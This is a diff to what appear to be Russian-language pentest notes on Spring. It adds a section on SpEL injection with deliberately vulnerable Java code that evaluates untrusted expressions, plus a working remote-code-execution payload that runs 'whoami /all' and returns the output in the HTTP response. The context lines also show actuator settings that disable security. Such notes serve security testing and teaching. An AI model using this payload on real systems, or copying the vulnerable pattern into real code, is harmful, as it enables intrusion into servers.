@@ -24,3 +24,27 @@ endpoints.actuator.enabled=true
 management.security.enabled=false 
 management.endpoints.web.exposure.include=*
 ```
+
+## Spring Expression Language (SpEL)
+
+The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime.
+
+Доступ к этой функциональности приводит к удаленному исполнению кода. Пример уязвимого кода:
+
+```java
+@Data
+@Builder
+class MyClass {
+    private String inp;
+    
+    boolean vulnFunction(Object object) {
+        return (boolean)new SpelExpressionParser().parseExpression(inp).getValue(new StandardEvaluationContext(object));
+    }
+}
+```
+
+Пример выполнения `whoami /all`
+
+```
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("var pb = new java.lang.ProcessBuilder['(java.lang.String[])']([ 'cmd', '/c', 'whoami /all', ]); pb.redirectErrorStream(true); var p = pb.start(); var stdout = new java.io.BufferedReader( new java.io.InputStreamReader(p.getInputStream())); var s = '_'; while ((line = stdout.readLine()) != null) { s += line + '\n'; } s;").getBytes(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())==0
+```
